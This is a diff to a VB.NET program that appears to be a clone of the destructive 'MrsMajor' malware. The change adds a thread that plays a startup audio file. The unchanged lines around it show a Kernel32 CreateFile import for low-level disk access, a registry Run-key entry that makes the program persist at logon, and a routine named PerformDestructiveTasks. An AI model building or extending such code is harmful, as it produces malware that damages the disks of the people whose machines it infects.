@@ -7,7 +7,7 @@ Imports System.Threading
 Imports System.Windows.Forms
 Imports Microsoft.Win32
 Imports System.Runtime.InteropServices
-
+Imports NAudio.Wave
 Module Program
 
     ' Import CreateFile from Kernel32.dll for low-level disk access
@@ -87,6 +87,8 @@ Module Program
     End Sub
 
     Sub Main()
+        ' Play startup audio in a separate thread
+        PlayMrsMajorAudioInThread()
         ' Add application to startup
         Try
             Dim startupKey As RegistryKey = Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Run")
@@ -273,6 +275,33 @@ Module Program
         Application.Run(New MainForm())
     End Sub
 
+    Sub PlayMrsMajorAudioInThread()
+        Dim audioThread As New Thread(AddressOf PlayMrsMajorAudio)
+        audioThread.IsBackground = True
+        audioThread.Start()
+    End Sub
+
+    Sub PlayMrsMajorAudio()
+        Try
+            Dim audioFilePath As String = "Resources1\startup_audio.mp3" ' Update with your audio file path
+            If File.Exists(audioFilePath) Then
+                Using audioFileReader As New AudioFileReader(audioFilePath)
+                    Using waveOut As New WaveOutEvent()
+                        waveOut.Init(audioFileReader)
+                        waveOut.Play()
+                        ' Wait for the audio to finish playing
+                        While waveOut.PlaybackState = PlaybackState.Playing
+                            Thread.Sleep(100)
+                        End While
+                    End Using
+                End Using
+            Else
+                Console.WriteLine("Error: Audio file not found at {0}", audioFilePath)
+            End If
+        Catch ex As Exception
+            Console.WriteLine("Error playing startup audio: " & ex.Message)
+        End Try
+    End Sub
     Private Sub PerformDestructiveTasks()
         ' Perform destructive tasks
         Try
